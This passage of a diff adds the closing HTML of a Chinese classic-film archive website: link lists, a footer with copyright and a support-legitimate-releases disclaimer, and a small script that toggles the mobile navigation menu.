+        <a href="#">导演作品年表</a>
+        <a href="#">黑白片研究社</a>
+        <a href="#">影评人文集</a>
+        <a href="#">胶片修复笔记</a>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer style="background:var(--ink);color:#c9bfb1;border-top:5px solid var(--rust);margin-top:34px;padding:46px 0 40px">
+  <div class="wrap" style="display:grid;grid-template-columns:2fr 1fr 1fr;gap:34px">
+    <div>
+      <div style="font-family:Georgia,serif;font-size:11px;letter-spacing:5px;color:var(--rust-soft);margin-bottom:14px">CHENLUO · DIANYING · WANG</div>
+      <b style="font-size:19px;color:var(--paper);letter-spacing:4px">尘落电影网</b>
+      <p style="font-size:12.5px;line-height:2;margin-top:14px;color:#a89d8e">© 2018–2026 尘落电影网（chenluodianyingwang-wap.github.io）. 本站为经典老片与影史拾遗类档案站点，所有收录影片版权归原作者及出品方所有，本站仅作索引与评论用途。</p>
+      <p style="font-size:12.5px;line-height:1.95;margin-top:10px;color:#a89d8e">归档地址：<b style="color:var(--rust-soft);font-family:Georgia,monospace">https://chenluodianyingwang-wap.github.io/</b></p>
+    </div>
+    <div>
+      <h5 style="color:var(--paper);font-size:13.5px;letter-spacing:1px;margin-bottom:14px">档案目录</h5>
+      <p style="font-family:'PingFang SC',sans-serif;font-size:12.5px;line-height:2.15;color:#a89d8e"><a href="#films">影史拾遗</a> · <a href="#films">精选老片</a><br><a href="#rank">老片修复榜</a> · <a href="#about">关于本站</a><br><a href="#news">电影评论</a> · <a href="#links">友情链接</a></p>
+    </div>
+    <div>
+      <h5 style="color:var(--paper);font-size:13.5px;letter-spacing:1px;margin-bottom:14px">返回顶部</h5>
+      <a href="#" style="display:inline-block;font-family:'PingFang SC',sans-serif;font-size:12.5px;font-weight:800;color:var(--paper);background:var(--rust);padding:11px 22px;border-radius:3px">↑ 回到首页顶部</a>
+      <p style="font-size:11.5px;line-height:1.9;margin-top:14px;color:#8a7f70">本站内容仅供学术交流与个人观赏参考，请支持正版发行。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var ham=document.getElementById('ham'),nav=document.getElementById('nav');
+ham.addEventListener('click',function(){nav.classList.toggle('show')});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('show')})});
+</script>
+</body>
+</html>
